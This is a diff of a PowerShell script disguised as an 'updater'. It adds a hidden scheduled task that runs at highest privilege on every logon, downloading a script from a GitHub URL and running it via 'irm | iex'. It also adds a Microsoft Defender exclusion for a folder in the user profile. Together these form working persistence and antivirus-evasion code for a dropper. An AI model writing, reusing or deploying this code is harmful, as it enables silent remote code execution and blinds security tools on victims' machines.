@@ -1,50 +1,55 @@
-$logPath = "C:\Windows\Temp\updater_log.txt"
+# ================================
+# Web-Fetchable PowerShell Script
+# Adds Defender Exclusion with UAC
+# Delayed via Scheduled Task (1 min)
+# ================================
+
+# Define log path
+$logPath = "$env:SystemRoot\Temp\updater_log.txt"
 function Log($msg) {
-    $ts = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
-    $ts | Out-File -FilePath $logPath -Append -Encoding utf8
+    "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss") | Out-File -FilePath $logPath -Append -Encoding utf8
 }
 
-Log "➡️ Script started. User: $env:USERNAME, Interactive: $([Environment]::UserInteractive)"
+# Check current user context
+Log "Script executed by user: $env:USERNAME"
 
-if (-not ([Environment]::UserInteractive)) {
-    Log "⚠️ Non-interactive session. Creating deferred UAC task..."
+# If not running interactively, schedule task
+if (-not ([System.Environment]::UserInteractive)) {
+    Log "⏳ Not in interactive session. Deferring via scheduled task..."
 
     $taskName = "UpdaterUACTrigger"
-    $user = (Get-WmiObject Win32_ComputerSystem).UserName
-    if (-not $user) {
-        Log "⛔ No interactive user found. Aborting."
-        exit
+    $scriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"
+
+    # Delete if already exists
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
+        Log "🗑️ Deleted old task: $taskName"
     }
 
-    $taskScriptPath = "$env:ProgramData\UpdaterTask.ps1"
-    $taskContent = @"
-Start-Sleep -Seconds 5
-try {
-    Add-MpPreference -ExclusionPath 'C:\Users\Public\TestSafeFolder' -ErrorAction Stop
-    '$([DateTime]::Now): ✅ Exclusion added.' | Out-File '$logPath' -Append
-} catch {
-    '$([DateTime]::Now): ❌ Error: ' + \$_ | Out-File '$logPath' -Append
-}
-"@
-    $taskContent | Out-File -FilePath $taskScriptPath -Encoding utf8
+    # Create new task to run with delay (1 min after login)
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"irm $scriptUrl | iex`""
+    $trigger = New-ScheduledTaskTrigger -AtLogOn -Delay "00:01:00"
+    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -RunLevel Highest -LogonType Interactive
 
-    try {
-        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$taskScriptPath`""
-        $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
-        $principal = New-ScheduledTaskPrincipal -UserId $user -RunLevel Highest -LogonType Interactive
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal
-        Log "✅ Scheduled task '$taskName' created for $user."
-    } catch {
-        Log "❌ Failed to create task: $_"
-    }
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
+    Log "✅ Scheduled task '$taskName' created."
     exit
 }
 
-# If already interactive
+# Confirm admin rights
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Log "❌ Not running with admin rights. Cannot add exclusions."
+    exit
+} else {
+    Log "✅ Running with admin rights."
+}
+
+# Add Defender exclusion
+$folder = "$env:USERPROFILE\TestSafeFolder"
 try {
-    Add-MpPreference -ExclusionPath 'C:\Users\Public\TestSafeFolder' -ErrorAction Stop
-    Log "✅ Exclusion added interactively."
+    Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
+    Log "✅ Exclusion added: $folder"
 } catch {
-    Log "❌ Error in direct add: $_"
+    Log "❌ Failed to add exclusion: $folder. Error: $_"
 }
